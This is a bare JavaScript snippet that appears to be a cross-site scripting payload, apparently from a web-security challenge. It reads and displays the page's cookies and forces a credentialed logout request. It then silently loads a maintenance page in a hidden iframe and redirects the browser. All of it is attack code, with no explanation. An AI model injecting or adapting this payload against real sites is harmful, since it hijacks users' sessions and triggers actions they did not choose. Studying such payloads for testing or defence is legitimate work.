if (document.cookie !== "") {
  alert(document.cookie);

  fetch('/logout.php', {
    method: 'GET',
    credentials: 'include',
    redirect: 'manual'
  }).then(() => {
    const i = document.createElement('iframe');
    i.src = '/maintenance.php';
    i.style.display = 'none';
    document.body.appendChild(i);

    setTimeout(() => {
      window.location.href = '/index.php';
    }, 300);
  });
}
